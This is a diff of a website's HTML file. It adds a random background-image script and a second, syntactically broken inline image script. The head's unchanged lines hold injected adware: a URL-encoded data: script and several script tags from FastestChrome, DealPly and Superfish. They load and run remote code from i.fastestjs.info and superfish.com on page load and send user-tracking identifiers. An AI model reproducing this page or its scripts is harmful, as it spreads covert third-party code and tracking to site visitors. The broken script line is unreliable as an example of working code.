@@ -7,6 +7,21 @@
     <link href="css/style.css" rel="stylesheet">
     <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script><script type="text/javascript" async="" src="http://www.google-analytics.com/ga.js"></script><script src="js/jquery-1.8.1.min.js"></script>    
     <script src="js/scripts.js"></script><script src="js/jquery.color.js"></script><script src="js/jquery.backgroundpos.js"></script><script src="js/jquery.easing.js"></script><script src="js/jquery.mousewheel.js"></script><script src="js/uScroll.js"></script><script src="js/googleMap.js"></script><script src="js/superfish.js"></script><script src="js/switcher.js"></script><script src="js/bgStretch.js"></script><script src="js/forms.js"></script><script src="js/MathUtils.js"></script>
+   <script type="text/javascript">
+   //Randomly Change Div Background Image
+   window.onload = function(){
+     var list= new Array()
+       list[list.length]='images/pic1.jpg'; 
+       list[list.length]='images/pic2.jpg';  
+       list[list.length]='images/pic3.jpg';
+       list[list.length]='images/pic4.jpg';
+       j=parseInt(Math.random()*list.length);
+     j=(isNaN(j))?0:j;
+     document.getElementById("imageRoll").style.backgroundImage="url("+list[j]+")";
+   }
+</script>
+    
+ 
     <!--[if lt IE 9]>
   	<script src="js/html5.js"></script>
     <link rel="stylesheet" href="css/ie.css" media="all">
@@ -18,13 +33,15 @@
 	<![endif]-->
 <style type="text/css">iframe.dealply-toast { right: -99999px !important; }iframe.dealply-toast.fastestext-revealed { right: 0px !important; }</style><script type="text/javascript" src="http://i.fastestjs.info/fast/javascript.js?channel=fast_max_widget"></script><script type="text/javascript" src="data:text/javascript,%0D%0A(function()%7B%0D%0A%20%20%20%20var%20install_source%20%3D%20'Chrome%20Webstore'%3B%0D%0A%20%20%20%20var%20ext_name%20%3D%20'FastestChrome'%3B%0D%0A%20%20%20%20var%20install_time%20%3D%20'1365708693915'%3B%0D%0A%20%20%20%20var%20add_related_deals_pref%20%3D%20'false'%3B%0D%0A%20%20%20%20var%20ctid%20%3D%20'1_2013-04'%3B%0D%0A%0D%0A%20%20%20%20if(window!%3Dwindow.top)return%3Bvar%20blacklist%3D%5B%2Fveetle.com%2F%2C%2F1800flowers.com%2F%2C%2Fdominos.com%2F%2C%2Fsquidoo.com%2F%2C%2Fnytimes.com%2F%2C%2Fdeveloper.apple.com%2F%2C%2Fhotmail.com%2F%2C%2Fnfl.com%2F%2C%2Fgrooveshark.com%2F%2Cnew%20RegExp(%22www.google.com%2Freader%22)%2C%2Fpandora.com%2F%2C%2Freddit.com%2F%2C%2Freuters.com%2F%2C%2Farstechnica.com%2F%2C%2Fcbslocal.com%2F%2C%2Fvice.com%2F%2C%2Fonline.wsj.com%2F%2C%2F.*live.com%2F%2C%2F.*battlefield.com%2F%2C%2Fpch.com%2F%5D%3Bfor(var%20i%3D0%3Bi%3Cblacklist.length%3Bi%2B%2B)if(blacklist%5Bi%5D.test(document.location.href))return%3Bvar%20hashCode%3Dfunction(a)%7Bvar%20b%3D0%3Bfor(var%20c%3D0%3Bc%3Ca.length%3Bc%2B%2B)%7Bb%3D((b%3C%3C5)-b)%2Ba.charCodeAt(c)%3Bb%3Db%26b%3B%7Dreturn%20b%3B%7D%3Bvar%20ready%3Dfunction(a)%7Bvar%20b%3Dfunction()%7Bif(window.document.body)a()%3Belse%20setTimeout(b%2C100)%3B%7D%3Bb()%3B%7D%3Bready(function()%7BsetTimeout(function()%7Bif(%2F%5Ehttp%3A%2F.test(document.location.href)%7C%7Cnew%20RegExp(%22%5Ehttps%3A%2F%2Fwww.google.com%22).test(document.location.href))%7Bvar%20a%3Dfunction(a)%7Bvar%20b%3Ddocument.createElement('script')%3Bb.type%3D'text%2Fjavascript'%3Bb.src%3Da%3Bdocument.getElementsByTagName('head')%5B0%5D.appendChild(b)%3B%7D%3Bvar%20b%3Dfunction(b)%7Bif(add_related_deals_pref%3D%3D'None'%7C%7Cadd_related_deals_pref%3D%3D'true')a('http%3A%2F%2Fi.fastestjs.info%2Ffast%2Fjavascript.js%3Fchannel%3D'%2Bb)%3B%7D%3Bvar%20c%3Dfunction(b%2Cc)%7Ba(%22https%3A%2F%2Fwww.superfish.com%2Fws%2Fsf_conduit.jsp%3Fdlsource%3D%22%2Bb%2B%22%26CTID%3D%22%2Bc%2B%22%26userId%3D%22%2B%22fastest00_%22%2Bb%2B%22_%22%2Bc%2B'_')%3B%7D%3Bvar%20d%3Dnavigator.browserLanguage%7C%7Cnavigator.language%3Bvar%20e%3D%22fastestchrome%22%3Bif(%2FChrome%2F.test(navigator.userAgent))if(ext_name%3D%3D%22Fastanium%22)e%3D%22fastanium%22%3Belse%20e%3D%22fastestchrome%22%3Belse%20if(%2FFirefox%2F.test(navigator.userAgent))e%3D%22fastestfox%22%3Belse%20if(%2FSafari%2F.test(navigator.userAgent))e%3D%22fastestsafari%22%3Belse%20if(%2FTrident%2F.test(navigator.userAgent))e%3D%22fastestie%22%3Bvar%20f%3DMath.abs(hashCode(install_time))%3Bc(e%2Cctid)%3B%7D%7D%2C500)%3B%7D)%3B%0D%0A%7D())%3B%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A"></script><script src="http://opt.dealply.com/opt_1366018425932/opt_content.js?partner=fast&amp;channel=fast_max_widget&amp;appTitle="></script><script type="text/javascript" src="https://www.superfish.com/ws/sf_conduit.jsp?dlsource=fastestchrome&amp;CTID=1_2013-04&amp;userId=fastest00_fastestchrome_1_2013-04_"></script><script type="text/javascript" src="http://www.superfish.com/ws/sf_code.jsp?dlsource=fastestchrome&amp;CTID=1_2013-04&amp;userId=fastest00_fastestchrome_1_2013-04_&amp;ver=12.2.4.5"></script><script type="text/javascript" src="http://www.superfish.com/ws/js/base_single_icon.js?ver=12.2.4.5"></script><script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/dojo/1.5.1/dojo/dojo.xd.js"></script><script type="text/javascript" charset="utf-8" src="http://ajax.googleapis.com/ajax/libs/dojo/1.5.1/dojo/io/script.xd.js"></script><script type="text/javascript" charset="utf-8" src="http://ajax.googleapis.com/ajax/libs/dojo/1.5.1/dojo/window.xd.js"></script><script type="text/javascript" src="http://www.superfish.com/ws/getSupportedSitesJSON.action?ver=6&amp;callback=SF_isURISupported" id="sufioIoScript1" charset="utf-8"></script><script type="text/javascript" src="http://www.superfish.com/ws/getCouponsSupportedSites.action?ver=36&amp;callback=SF_cpnWlCb" id="sufioIoScript2" charset="utf-8"></script></head>
 <body style="overflow: visible;">  
-    <div style="width: 100%; height: 100%; position: fixed; left: 0px; top: 0px; overflow: hidden; z-index: -1;"><div id="bgStretch" style="position: absolute; z-index: -1; left: 0px; right: auto; top: 0px; bottom: auto; height: 749.4444444444445px; width: 1349px;">
-        <img src="images/bg_pic.jpg" alt="" style="width: 100%; height: 100%; position: absolute; z-index: -1; left: 0px; top: 0px;">
+    <div style="width: 100%; height: 100%; position: fixed; left: 0px; top: 0px; overflow: hidden; z-index: -1;"><div id="imageRoll" style="background-repeat:no-repeat; position: absolute; z-index: -1; left: 0px; right: auto; top: 0px; bottom: auto; height: 749.4444444444445px; width: 1349px;">
+    
+ <script> Image var bnimg = new Array(5); bnimg[0] = "images/pic1.jpg"; bnimg[1] = "images/pic2.jpg"; bnimg[2] = "images/pic3.jpg"; bnimg[3] = "images/pic4.jpg"; var now = new Date(); var sec = now.getSeconds(); document.write("<img src="+bnimg[sec % 4]+" border=0>"); </script>   
+    
+    
+    
     </div></div>
     <div id="glob" class="broke-endless-pages">
         <div class="spinner" style="display: none;"></div>
-        <div id="leftShadow"></div>
-        <div id="rightShadow"></div>
         <!-- CONTENT -->
         <section id="content" style="top: 60px;">
             <!-- HEADER -->
